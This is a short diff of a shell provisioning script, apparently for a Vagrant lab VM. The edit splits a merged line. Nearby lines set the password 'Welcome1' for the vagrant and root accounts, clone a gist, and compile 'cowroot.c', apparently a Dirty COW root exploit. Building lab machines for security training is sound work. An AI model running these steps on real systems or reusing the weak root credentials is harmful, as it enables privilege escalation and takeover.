@@ -52,7 +52,8 @@ echo "Welcome1" | passwd --stdin vagrant
 echo "Welcome1" | passwd --stdin root 
 
 #building exploit
-echo "Building exploit"su - vagrant -c "git clone https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git"
+echo "Building exploit"
+su - vagrant -c "git clone https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git"
 su - vagrant -c "gcc -pthread /home/vagrant/e9d4ff65d703a9084e85fa9df083c679/cowroot.c  -o ~/exploit"
 
 clear
